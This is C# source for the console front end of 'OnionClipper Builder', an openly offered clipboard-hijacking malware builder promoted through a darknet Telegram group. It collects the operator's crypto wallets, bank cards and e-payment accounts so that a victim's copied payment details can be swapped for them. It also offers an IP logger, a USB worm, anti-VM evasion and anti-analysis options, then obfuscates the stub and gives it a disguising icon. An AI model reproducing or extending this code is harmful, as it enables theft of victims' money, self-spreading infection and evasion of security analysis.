/* 
    Author : Megavolt
    Github : github.com/megavolt666
	Telegram Group : t.me/DOLFX
	Telegram Author : t.me/megavoltcoder
*/

using System;

namespace OnionClipperBuilder
{
    class Program
    {
        [STAThreadAttribute]
        static void Main(string[] args)
        {
            Console.Title = "OnionClipper Builder";
            cli.ShowInfo("OnionClipper coded by Megavolt");
            cli.ShowInfo("t.me/DOLFX - TOP GROUP IT DARKNET");
            cli.ShowInfo("t.me/DOLFX - TOP GROUP IT DARKNET");
            cli.ShowInfo("t.me/DOLFX - TOP GROUP IT DARKNET");

            cli.ShowInfo("Telegram Author- t.me/megavoltcoder");

            build.ConfigValues["logger"] = cli.GetBoolValue("Install IPLogger?");
            if (build.ConfigValues["logger"].Equals("1"))
            {
                build.ConfigValues["IPL"] = cli.GetEncryptedString("Your IPLogger address?");
            }
            build.ConfigValues["BTC"] = cli.GetEncryptedString("Your BTC address? 375JsTNEJ6p5DkeTPzdc67i8agkKxCxhji");
            build.ConfigValues["Etherium"] = cli.GetEncryptedString("Your Etherium address? 0x********************************");
            build.ConfigValues["LiteCoin"] = cli.GetEncryptedString("Your LiteCoin address? L*******************************");
		    build.ConfigValues["Monero"] = cli.GetEncryptedString("Your Monero address? 8********************************");
			
            build.ConfigValues["SBER"] = cli.GetEncryptedString("Your SBERBANK visa card? 4274000000000000");
            build.ConfigValues["MSB"] = cli.GetEncryptedString("Your SBERBANK mastercard card? 5469000000000000");
			build.ConfigValues["QIWIC"] = cli.GetEncryptedString("Your QIWI card? 5469000000000000");
            // Encrypt values
            build.ConfigValues["QIWI"] = cli.GetEncryptedString("Your QIWI? 79006666666");
            build.ConfigValues["YANDEXMONEY"] = cli.GetEncryptedString("Your YANDEX MONEY? 41001151267747");
            build.ConfigValues["MEGAD"] = cli.GetEncryptedString("Your MEGADISK? https://example.com/");
            build.ConfigValues["STEAM"] = cli.GetEncryptedString("Your STEAM? https://example.com/");
		    build.ConfigValues["YDISK"] = cli.GetEncryptedString("Your YANDEXDISK? https://example.com/");
		    build.ConfigValues["DONAT"] = cli.GetEncryptedString("Your DONAT? https://example.com/");
					
		    build.ConfigValues["QIWIKOP"] = cli.GetEncryptedString("Your QIWI KOP? https://example.com/");

			build.ConfigValues["QIWINIK"] = cli.GetEncryptedString("Your QIWI NICK? https://example.com/");	

            build.ConfigValues["PAYER"] = cli.GetEncryptedString("Your PAYEER? P1026*****");
            build.ConfigValues["WMR"] = cli.GetEncryptedString("Your WMR? R6566566*******");
            build.ConfigValues["WMZ"] = cli.GetEncryptedString("Your WMZ? Z5675674*******");
		    build.ConfigValues["WMX"] = cli.GetEncryptedString("Your WMX? X5447897*******");
		    build.ConfigValues["WMU"] = cli.GetEncryptedString("Your WMU? U4765896*******");

            build.ConfigValues["Infectionusb"] = cli.GetBoolValue("Enable USB WORM?");
            build.ConfigValues["antivm"] = cli.GetBoolValue("Enable ANTIVM?");
            build.ConfigValues["dotmemory"] = cli.GetBoolValue("Enable DOTMEMORY?");



            // Installation
            // build.ConfigValues["AntiAnalysis"] = cli.GetBoolValue("Use anti analysis?");
            // build.ConfigValues["Startup"] = cli.GetBoolValue("Install autorun?");
            //   build.ConfigValues["StartDelay"] = cli.GetBoolValue("Use random start delay?");
            // File grabber
            // Build
            string builded = build.BuildStub();
            string confuzed = obfuscation.Obfuscate(builded);
            // Select icon
            if (System.IO.Directory.Exists("icons"))
                if (cli.GetBoolValue("Do you want change file icon?") == "1")
                {
                    string icon = cli.GetIconPath();
                    if (icon != null)
                        IconChanger.InjectIcon(confuzed, icon);
                }
            // Done
            cli.ShowSuccess("Obfuscated stub: " + confuzed + " saved.");
            Console.ReadLine();
        }
    }
}
